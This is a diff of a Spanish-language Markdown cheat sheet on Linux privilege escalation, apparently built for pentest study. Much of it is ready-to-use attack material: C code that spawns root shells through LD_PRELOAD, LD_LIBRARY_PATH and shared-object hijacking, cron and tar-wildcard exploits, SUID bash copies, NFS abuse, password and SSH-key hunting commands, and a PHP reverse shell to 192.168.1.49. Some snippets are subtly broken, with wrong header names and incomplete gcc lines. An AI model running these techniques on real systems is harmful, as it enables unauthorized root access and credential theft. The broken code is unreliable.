@@ -2,7 +2,7 @@
 
 *"Hacking is not about exploits, hacking is using what you have"*
 
-## Objetivo
+## Objetivo
 
 El objetivo de realizar una escalada de privilegios no es otro que obtener una shell de root en el sistema. Para conseguir este fin puede ser tan fácil como usar un exploit de kernel, que el usuario root tenga como password toor o que se necesiten encadenar varios errores de configuración. 
 
@@ -15,6 +15,10 @@ Los recursos consultados para llevar a cabo esta recopilación son:
 - https://github.com/sagishahar/lpeworkshop
 - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
 - https://blog.carreralinux.com.ar/
+- https://www.exploit-db.com/papers/33930
+- https://gtfobins.github.io
+- https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+- https://www.udemy.com/course/linux-privilege-escalation/
 
 ## Algo de teoria y conceptos clave
 
@@ -26,7 +30,7 @@ Un sistema Linux tiene tres niveles:
 - Kernel: Core del sistema operativo. Reside en la memoria y le dice a la CPU que ha de hacer. El kernel es un interfaz entre el hardware y cualquier programa en ejecución
 - User space: Los programas que utiliza el usuario final, tales como las "shell" u otras aplicaciones con ventanas. Como es lógico estas aplicaciones necesitan interaccionar con el hardware del sistema, pero no lo hacen directamente, sino a través de las funciones que soporta el kernel.
 
-#### Kernel
+#### Kernel
 
 Principalmente se encarga de 4 tareas:
 
@@ -49,7 +53,7 @@ Asi que en el espacio de usuario:
 - Es donde las aplicaciones de los usuarios son ejecutadas.
 - Tambien es donde se encuentra la libreria GNU C (glibc)
 
-#### Diferencia esencial
+#### Diferencia esencial
 
 El kernel se ejecuta en modo "kernel mode" y tiene acceso "total" al procesador y a la memoria principal. Por lo tanto, es el dueño y señor del sistema. A la area donde solo puede acceder el Kernel se denomina Kernel Space
 
@@ -57,7 +61,7 @@ En cambio, los procesos que se ejecutan en user space se ejecutan de forma "rest
 
 Por lo tanto, si un proceso en user space se pudre, es facil que no tumbes el sistema, simplemente el kernel se hara cargo de ese proceso y lo "limpiara".
 
-#### Glibc
+#### Glibc
 
 Glibc es la librería C  proporciona y define las llamadas al sistema y otras funciones básicas utilizada por casi todos los programas como open, malloc, printf, etc. La librería C es utilizada por todos los programas enlazados dinámicamente. En los sistemas Linux se instala con el nombre de libc6.
 
@@ -194,7 +198,7 @@ En la respuesta el primer caracter indica que es:
 - (-):  file
 - d: directory
 
-### Ficheros /etc/passwd y /etc/shadow
+### Ficheros /etc/passwd y /etc/shadow
 
 #### Fichero /etc/passwd
 
@@ -320,6 +324,8 @@ Funciones que consultan PATH:
 Instrucciones clave relacionadas con las variables de entorno:
 
 - env: Listar las variables de entorno actuales
+- Set
+- Set Variable=Valor
 - Echo $nombre_variable: Mostrar el valor de una variable (echo $PATH)
 
 Modificar el path, o mejor dicho, complementar:
@@ -599,7 +605,7 @@ Las cuatro operaciones principales para gestionar memoria en C son:
 
 Formas de llevar a cabo una escalada de privilegios hay muchas, de las más sencillas a las más complejas, y a veces lo más facil es empezar a tirar exploits y herramientas como si no hubiera un mañana. Personalmente, no estoy muy a favor de esta forma de actuar, hay riesgo de dejar el servidor atontado, de hacer más ruido del debido o de obtener tal volumen de información que no sepa "tratar". 
 
-Yo prefiero empezar con un analisis "old shool", poco a poco. Sin embargo,llegado el momento, el uso de alguna tool especifica puede ayudar mucho, siempre que se sepa que se esta haciendo y se gestione correctamente toda la información que se obtendra. 
+Yo prefiero empezar con un analisis "old school", poco a poco. Sin embargo,llegado el momento, el uso de alguna tool especifica puede ayudar mucho, siempre que se sepa que se esta haciendo y se gestione correctamente toda la información que se obtendra. 
 
 Realmente, la unica ténica valida es Enumerar, enumerar más y darle vueltas a la cabeza, no hay más secreto.
 
@@ -620,7 +626,7 @@ Realmente, la unica ténica valida es Enumerar, enumerar más y darle vueltas a 
 
 En esta primera fase, se lleva a cabo una enumeración muy básica del terminal y se prueban algunas ideas locas por su simpleza
 
-#### ¿Quién soy, quién hay ahí?
+#### ¿Quién soy, quién hay ahí?
 
 ##### Objetivo
 
@@ -634,6 +640,8 @@ Obtener información de nuestro usuario y de otros usuarios de la máquina.
 - cat /etc/passwd | cut -d: -f1: List of users
 - awk -F: '($3 == "0") {print}' /etc/passwd: List of super users
 - awk -F: '{printf "%s:%s\n",$1,$3}' /etc/passwd: listar usuarios con id
+- Screen -ls
+- tmux ls
 
 #### ¿Dónde estoy, qué sistema es?
 
@@ -775,7 +783,7 @@ Conocer que puertos y servicios asociados estan activos
   - Lsoft lista los ficheros abiertos en el sistema. Otros comandos útiles: -p PID, -u Use, -c nombre_proceso, +D directorio/path concreto
 - iptables -L: Listar las reglas de iptables
 
-#### Bala de plata II: NFS
+#### Bala de plata II: NFS
 
 Tal y como se ha comentado antes, NFS no esta "diseñado" para ser seguro per se. En determinadas condiciones, es posible explotar su mala configuración y ser root.
 
@@ -824,7 +832,7 @@ When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a
 6. copy wanted shell: cp /bin/bash
 7. set suid permission: chmod +s bash
 
-### Tercera fase: Enumeracion de servicios y Cron
+### Tercera fase: Enumeración de servicios y Cron
 
 En esta fase se obtendra información sobre los servicios que se estan ejecutando, con que tipo de permisos y también se revisaran las tareas Cron que haya en el terminal.
 
@@ -846,11 +854,11 @@ Determinar que servicios se estan ejecutando, comprobar sus permisos y ver si ha
 
 #### ¿Qué información puedo obtener de Cron?
 
-#### Objetivo
+##### Objetivo
 
 Obtener todo la información posible sobre el servicio Cron.
 
-##### Instrucciones
+##### Instrucciones
 
 - crontab -l
 - ls -alh /var/spool/cron
@@ -914,42 +922,47 @@ _Linux VM_
 13. In command prompt type: strings /tmp/mem | grep passw
 14. From the output, note the credentials in clear-text.
 
-#### Bala de plata V: Atacando Cron
+#### Bala de plata IV: Atacando Cron
 
-Configuraciones:
+##### Configuraciones
 
-Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation.
+Si un fichero que se ejecuta con cron no esta bien configurado podria ser posible modificarlo y conseguir una escalada de privilegios muy fáciles. Por ejemplo, si tenemos permiso de escritura de un fichero que se ejecuta con cron, se podria modificar el código.
 
-If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code.
+Por ejemplo, un cron ejecutado con permisos de root:
 
-PATH contiene o indica la ruta a los directorios en los cuales cron buscará el comando a ejecutar. Este path es distinto al path global del sistema o del usuario. El Path de contrab es por defecto /usr/
-Una posibilidad es modificar la variable Path del fichero crontab para que busque determinado fichero en una ubicacion concreta
+int main() {
+setuid(0);
+system("/bin/bash -p");
+}
 
-The crontab PATH environment variable is by default set to /usr/bin:/bin
+gcc -o filename.c
 
-The PATH variable can be overwritten in the crontab file.
+##### Modificación del Path
 
-If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.
+PATH contiene o indica la ruta a los directorios en los cuales cron buscará el comando a ejecutar. Este path es distinto al path global del sistema o del usuario. 
 
-Explotación
+- Una posibilidad es modificar la variable Path del fichero crontab para que busque determinado fichero en una ubicacion concreta
+- Observar si un scrip cron no tiene definido un path absoluto, también puede ser un vector de ataque
 
-1- Compilar un shell file
-2- Colocarlo en una ubicacion del path
-3- Esperar que sea ejecutado por cron
+##### Explotación
+
+1. Compilar un shell file
+2. Colocarlo en una ubicacion del path accesible
+3. Esperar que sea ejecutado por cron
+
+##### Código
 
 echo 'cp /bin/bash tmp/bash; chmod +s /tmp/bash' > /path/to/file
 chmod +x /path/to/file
 /tmp/bash -p
+
+###### Explicación paramétro p
 
 Si el shell se inicia con el id. De usuario (grupo) efectivo no es igual al id. De usuario real (grupo), y no se proporciona la opción -p, no se leen los archivos de inicio, las funciones del shell no se heredan del entorno, , BASHOPTS, CDPATH y GLOBIGNORE, si aparecen en el entorno, se ignoran y la identificación de usuario efectiva se establece en la identificación de usuario real. Si la opción -p se proporciona en la invocación, el comportamiento de inicio es el mismo, pero el ID de usuario efectivo no se restablece.
 
 -p
 
 Activa el modo *privilegiado*. En este modo, el fichero correspondiente a **$ENV** no es procesado, las funciones del shell no se heredan desde el entorno,y la variable **SHELLOPTS**, si aparece en el entorno, no se tiene en consideración. Esta opción se activa automáticamente en el arranque si el identificador efectivo del usuario (o grupo) no es igual al identificador real del usuario (o grupo). Desactivar esta opción hace que los identificadores efectivos de usuario y grupo se pongan con los valores de los identificadores reales de usuario y grupo respectivamente.
-
-Sobreescritura de ficheros
-
-Localizar ficheros que se ejecutan en el cron y que son muy permisivos, tales como que puedan ser sobrescritos
 
 ### Cuarta fase: Buscando ficheros interesantes
 
@@ -988,13 +1001,15 @@ Buscar todos los servicios que se estan publicando y ver sus ficheros de configu
 
 - Encontrar todos los ficheros con permisos de escritura en /etc
 
-- find /etc -maxdepth 1 -writable -type f
+  - find /etc -maxdepth 1 -writable -type f
 
 - Encontrar todos los ficheros con permisos de lectura en /etc:
 
   - find /etc -maxdepth 1 -readable -type -f
 
-- find /etc -maxdepth 1 -readable -type f -exec grep -Hin passw --color  {} \;
+- Buscar passwords en ficheros de configuración:
+
+  - find /etc -maxdepth 1 -readable -type f -exec grep -Hin passw --color  {} \;
 
   - _If you run  find with exec, {} expands to the filename of each file or directory found with  find_
 
@@ -1013,9 +1028,9 @@ Listar de forma recursiva /home y /root:
 - ls -ahlR /root/
 - ls -ahlR /home/
 
-#### ¿Qué sabemos de SSH?
+#### ¿Qué sabemos de SSH?
 
-##### Objetivo
+##### Objetivo
 
 Conseguir claves de conexión de SSH. Las claves SSH son la alternativa a los passwords SSH, siempre van en pareja y si no estan bien protegidas seria posible utilizarlas.
 
@@ -1044,11 +1059,11 @@ A lo bruto:
 - cat /etc/ssh/ssh_host_key.pub
 - cat /etc/ssh/ssh_host_key
 
-#### Bala de plata V: Sudo
+#### Bala de plata V: Sudo y ficheros SUID
 
 ##### Explotación de LD_Preload
 
-Sin en el fichero de sudoers hay "env_keep += LD_PRELOAD" , significa que LD_PRELOAD que no deja de ser una ubicación de librerias, esta activa. Por lo que cuando un usuario ejecute un programa con sudo, sudo sabe donde ha de buscar las librerias compartidas para funcionar. 
+Si en el fichero de sudoers hay "env_keep += LD_PRELOAD" , significa que LD_PRELOAD que no deja de ser una ubicación de librerias, esta activa. Por lo que cuando un usuario ejecute un programa con sudo, sudo sabe donde ha de buscar las librerias compartidas para funcionar. 
 
 La idea es crear un objeto .so, referenciado por LD_PRELOAD y que sera cargado antes que cualquier otro.
 
@@ -1087,6 +1102,10 @@ Como va a cargar con privilegios de sudo nuestra "shell" se ejecuta y voilà
 ###### Explicaciones sobre el código
 
 unsetenv: Environment variables such as LD_PRELOAD are inherited by child processes. The linked example overrides the _init symbol to invoke a shell using system("/bin/bash"). If the environment variable would not have been cleared, then it would effectively be stuck in an "infinite loop" when invoking system.
+
+Environment variables such as `LD_PRELOAD` are inherited by child processes. The linked example overrides the `_init` symbol to invoke a shell using system("/bin/bash"). If the environment variable would not have been cleared, then it would effectively be stuck in an "infinite loop" when invoking `system`.
+
+If you watch your process list (using `ps aux` for example), you will see a bunch of shell processes. The system library function creates a new process and executes `/bin/sh -c "...."`. Every time, `_init` is executed.
 
 system() hace un fork y ejecuta execl() con /bin/sh -c "COMMAND"
 
@@ -1129,15 +1148,44 @@ define multiple initialization and finalization functions.
 
 It is possible to define one or more functions that are executed automatically when a shared library is loaded and unloaded. This allows us to perform initialization and finalization actions when working with shared libraries. Initialization and finalization
 
-An older technique for shared library initialization and finalization is to create two functions, _init() and _fini(), as part of the library. The void _init(void) function contains code that is to executed when the library is first loaded by a process. The void _fini(void) function contains code that is to be executed when the library is unloaded. If we create _init() and _fini() functions, then we must specify the gcc –nostartfiles option when building the shared library, in order to prevent the linker from including default versions of these functions. (Using the –Wl,–init and –Wl,–fini linker options, we can choose alternative names for these two functions if desired.) Use of _init() and _fini() is now considered obsolete in favor of the gcc constructor and destructor attributes, which, among other advantages, allow us to define multiple initialization and finalization functions.
+##### LD_Library
 
-Environment variables such as `LD_PRELOAD` are inherited by child processes. The linked example overrides the `_init` symbol to invoke a shell using system("/bin/bash"). If the environment variable would not have been cleared, then it would effectively be stuck in an "infinite loop" when invoking `system`.
+LD_Library path contiene un listado de directorios donde se han de buscar librerias. 
 
-If you watch your process list (using `ps aux` for example), you will see a bunch of shell processes. The system library function creates a new process and executes `/bin/sh -c "...."`. Every time, `_init` is executed.
+El comando Ldd nos servira para conocer que librerias utiliza un binario:
 
+- $ ldd /usr/sbin/XXX
 
+La idea es substituir una libreria (lib_a_subs.so) que deba usar el binario XXX por una libreria que este bajo nuestro control
 
-##### Shell Escape Sequences
+El código es el siguiente:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void foo() __attribute__((constructor));
+
+void foo() 
+
+{ unsetenv("LD_LIBRARY_PATH"); 
+
+setresuid(0,0,0); 
+
+system("/bin/bash -p");
+
+}
+
+1. Compilación:
+
+   $ gcc -o lib_a_subs.so -shared -fPIC foo.c
+
+2. Ejecución:
+
+   $ sudo LD_LIBRARY_PATH=. XXX
+    \# id
+    uid=0(root) gid=0(root) groups=0(root)
+
+##### Shell Escape Sequences y abuso de funcionalidades
 
 Web de referencia: GTFOBins https://gtfobins.github.io
 
@@ -1204,6 +1252,91 @@ Algunos programas nos permiten "escapar" a la shell o abusar de ciertas funciona
   y si hacemos
   sudo apache2 -f /etc/shadow
 
+##### Shared objects
+
+Los ficheros "shared objects" (so) son la equivalencia linuxera a los ficheros dll de Windows
+
+- Contienen "funciones" reutilizables
+- Las funciones exportadas (symbols) se exportan via tabla 
+- Los objetos son cargadas dentro del contexto de un proceso existente
+
+Los metodos de linking:
+
+1. Static linking
+2. Dynamic Linking
+
+###### Explicación de la vulnerabilidad
+
+Cuando el programa es ejecutado, se cargaran los shared objects que se indican.
+
+Pero, ¿que pasaria si algunos de estos objetos no se cargan, porque no estan, pero nosotros tenemos acceso a esa ubicación? pues que podemos dar gato por liebre
+
+###### Detección
+
+_strace <executable_file> 2>&1 | grep -i -E "open|access| no such file"_
+
+###### Explotación
+
+1. Compilar un fichero .so
+2. Renombrarlo y utilizarlo en la localización identificada donde no hay fichero
+
+#include <studio.h>
+#include <stlib.h>
+
+static void foo() _ _attribute_ _ ((constructor));
+
+void foo() {
+
+​	setuid(0);
+
+​	system("/bin/bash -p");   
+
+}
+
+$ gcc -shared -fPIC -o path
+
+##### Symlink
+
+Contiene una referencia a otro fichero, pero ese fichero puede ser que no exista. Al igual que antes, esto significaria que podemos "ocupar" ese espacio con un fichero nuestro
+
+###### Detección
+
+- ls -l
+
+##### Variables de entorno
+
+###### Path
+
+Esta es la clasica, modificar la variable path indicando una ubicación que este bajo nuestro control y que anteceda a todas las demas. Se ubica un binario con el mismo nombre del que se "tendria" que ejecutar en esa ubicación y...a esperar.
+
+Algunas de las funciones que usan la variable Path:
+
+System()
+
+popen()
+
+Execlp()
+
+execvp()
+
+Execvpe()
+
+###### Detección
+
+- Hopper
+- Binary Ninja
+- idapro
+- Strings
+- strace -v -f -e execve command 2>&1 | grep exec
+- ltrace command
+
+###### Explotación
+
+1. Compilar un fichero ejecutable
+2. Renombrarlo si hace falta
+3. Colocarlo en una posicion donde podamos escribir
+4. Añadir la localización al PATH, pero que proceda a todos los otros paths definidos
+
 #### Bala de plata VI: Password mining
 
 ##### Objetivos
@@ -1216,9 +1349,9 @@ Un buen sitio para empezar son los ficheros de configuración de los servicios, 
 
 - grep -RiIn passw / 2>/dev/null: Recursivo, no case, número de linea, procesa un fichero binario como si no contuviera match
 - grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+- strings /dev/mem | grep -i PASS
+- $ locate password | more 
 - /var/log/: Es posible que hayan passwords en los logs
-
-###### Backups
 
 Un recurso que nos puede proporcionar información valiosa es la busqueda de backups:
 
@@ -1228,24 +1361,19 @@ Un recurso que nos puede proporcionar información valiosa es la busqueda de bac
 
 #### Bala de plata VII: Wildcards
 
-### Wildcards
+Fuente original: https://www.exploit-db.com/papers/33930
 
 Bash soporta "filename expension functionality" (globbing) (Filename expansion means expanding filename patterns or templates containing special characters. For example, example.??? might expand to example.001 and/or example.txt.)
-El caracter * significa que hace mach con cualquier string
-\* es remplazado por lista ordenada alfabeticamente
+El caracter * significa que hace mach con cualquier string, \* es remplazado por lista ordenada alfabeticamente
 
-Simple trick behind this technique is that when using shell wildcards, 
-especially asterisk (*), Unix shell will interpret files beginning with hyphen
-(-) character as command line arguments to executed command/program.
-That leaves space for variation of classic channeling attack.
-Channeling problem will arise when different kind of information channels 
-are combined into single channel. Practical case in form of particulary this technique 
-is combining arguments and filenames, as different "channels" into single,
-because of using shell wildcards.
+##### El truco
 
-En otras palabras, cuando Linux utiliza wildcars (como * ) y se encuentra con un archivo con un -antes, lo interpreta como una argumento al comando que se ejecuta:
+Simple trick behind this technique is that when using shell wildcards,  especially asterisk (*), Unix shell will interpret files beginning with hyphen(-) character as command line arguments to executed command/program. That leaves space for variation of classic channeling attack.
+Channeling problem will arise when different kind of information channels are combined into single channel. Practical case in form of particulary this technique is combining arguments and filenames, as different "channels" into single, because of using shell wildcards.
 
-por ejemplo: 
+En otras palabras, cuando Linux utiliza wildcars (como * ) y se encuentra con un archivo con un - antes, lo interpreta como una argumento al comando que se ejecuta:
+
+Por ejemplo: 
 
 [root@defensecode public]# rm *
 [root@defensecode public]# ls -al
@@ -1254,9 +1382,9 @@ drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .
 drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
 -rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
 
-
 Directory is totally empty, except for '-rf' file in it.
 All files and directories were recursively deleted, and it's pretty obvious what happened...
+
 When we started 'rm' command with asterisk argument, all filenames in current
 directory were passed as arguments to 'rm' on command line, exactly same as 
 following line:
@@ -1275,176 +1403,26 @@ Since filesystems in Linux are generally very permissive with filenames, and fil
 
 The following commands should show how this works:
 
-```
 $ ls *
 % touch ./-l
 $ ls *
-```
 
 Filenames are not simply restricted to simple options like -h or --help.
 
 In fact we can create filenames that match complex options: --option=key=value
 
-1-Crea un fichero que pueda ser interpretado como un argumento por la tarea
-2- Espera
+##### Explotación
+
+1. Crea un fichero que pueda ser interpretado como un argumento por la tarea
+2. Esperar que suceda la magia
 
 Por ejemplo: Tar tiene un argumento "checkpoint" asi pues:
 
-este argumento lo que hace es permitir al usuario definir una accion que ejecutar durante el checkpoint
+Este argumento lo que hace es permitir al usuario definir una accion que ejecutar durante el checkpoint
 
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
-touch /writable/path/used/by/tar --checkpoint=1
-touch /writable/path/used/by/tar --checkpoint-action=exec sh\ runme.sh
-
-#### Bala de plata VIII: Shared objects
-
-### Shared Object
-
-Los ficheros "shared objects" (so) son la equivalencia linuxera a los ficheros dll de Windows
-Contienen "funciones" reutilizables
-Las fucnciones exportadas (symbols) se exportan via tabla
-Cargadas dentro del contexto de un proceso existente
-Los metodos de linking:
-
-    1. Static linking
-    2. Dynamic Linking
-
-fuente a consultar: http://rachid.koucha.free.fr/tech_corner/shared_libs_test.html
-
-When a program is executed, it will try to load the shared objects it requires.
-
-By using a program called strace, we can track these system calls and determine whether any shared objects were not found.
-
-If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.
-
-#### Deteccion
-
-strace <executable_file> 2>&1 | grep -i -E "open|access| no such file"
-
-#### Explotacion
-
-1. Compilar un fichero .so
-2. Renombrarlo y utilizarlo en la localización identificada donde no hay fichero
-
-#include <studio.h>
-#include <stlib.h>
-
-static void inject() _ _attribute_ _ ((constructor));
-
-void inject() {
-    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
-
-}
-
-$ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
-
-##### Bala de plata IX: 
-
-Ld_library 
-
-The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
-
-The ldd command can be used to print the shared libraries used by a program:
-
-$ ldd /usr/sbin/apache2
-
-By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.
-
-Run ldd against the apache2 program file:
-
-Hijacking shared objects using this method is hit or miss. Choose one from the list and try it (libcrypt.so.1 seems to work well).
-
-$ ldd /usr/sbin/apache2
- linux-vdso.so.1 => (0x00007fff063ff000)
- ...
- libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000) libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000) libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000) /lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
-
-Create a file (library_path.c) with the following contents:
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-```
-
-static void hijack() __attribute__((constructor));
-
-void hijack() { unsetenv("LD_LIBRARY_PATH"); setresuid(0,0,0); system("/bin/bash -p");
-
-}
-
-1. Compile library_path.c into libcrypt.so.1:
-
-   $ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
-
-2. Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c):
-
-$ sudo LD_LIBRARY_PATH=. apache2
- \# id
- uid=0(root) gid=0(root) groups=0(root)
-
-#### Modificaciones Path:
-
-
-
-PATH
-
-Compilar un fichero ejecutable
-Renombrarlo si hace falta
-Colocarlo en una posicion donde podamos escribir
-Añadir la localización al PATH, pero que proceda a todos los otros paths definidos
-
-
-
-The PATH environment variable contains a list of directories where the shell should try to find programs.
-
-If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found.
-
-Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to. 
-
-symlink
-
-Contiene informacion a otro file o symbolic (soft link)
-Puede referenciar a ficheros que no existen
-
-Ln -s
-
-ls -l
-
-Deteccion
-
-Decompilar/disassmble
-
-- Hopper
-- Binary Ninja
-- idapro
-
-Programas vulnerables:
-
-Dpkg -l
-
-If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string.
-
-We can run strings on the executable file to find strings of characters.
-
-We can also use strace (llamadas al sistema) to see how the program is executing. Another program called ltrace (llamadas a librerías) may also be of use.
-
-```
-int main() {
-    setuid(0);
-    system("/bin/bash -p");
-}
-```
-
-1. ```
-   gcc -o service service.c
-   ```
-
-1. Prepend the current directory (or where the new service executable is located) to the PATH variable, and execute the SUID file for a root shell:
-
-$ PATH=.:$PATH /usr/local/bin/suid-env root@debian:~# id
- uid=0(root) gid=0(root) groups=0(root) ...
-
-### 
+- echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+- touch /writable/path/used/by/tar --checkpoint=1
+- touch /writable/path/used/by/tar --checkpoint-action=exec sh\ runme.sh
 
 ## Técnicas
 
@@ -1453,12 +1431,6 @@ $ PATH=.:$PATH /usr/local/bin/suid-env root@debian:~# id
 #### Sudo
 
 - Copiar el fichero /bin/bash con el SUID root set y ejecutar con -p
-- Crear un ejecutable.
-  - int main() {
-    setuid(0);
-    system("/bin/bash -p");
-    }
-  - gcc -o filename.c
 
 #### Metasploit
 
@@ -1490,16 +1462,21 @@ $ PATH=.:$PATH /usr/local/bin/suid-env root@debian:~# id
 
 - php -r ‘$sock=fsockopen(“192.168.1.49”,8080);exec(“/bin/sh -i <&3 >&3 2>&3”);’
 
-#### Sniffing de red
+### Sniffing de red
 
 - tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
 
-#### Port forwarded SSH
+### TTY-Shell
+
+- python -c 'import pty;pty.spawn("/bin/bash")'
+- echo os.system('/bin/bash')
+- /bin/sh -i
+
+### Port forwarded SSH
 
 - ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
 - ssh -L 8080:127.0.0.1:80 root@192.168.1.1    # Local Port
 - ssh -R 8080:127.0.0.1:80 root@192.168.1.1    # Remote Port
 - ssh -D 127.0.0.1:9050 -N [username]@[ip]
 - Proxychains
-
 
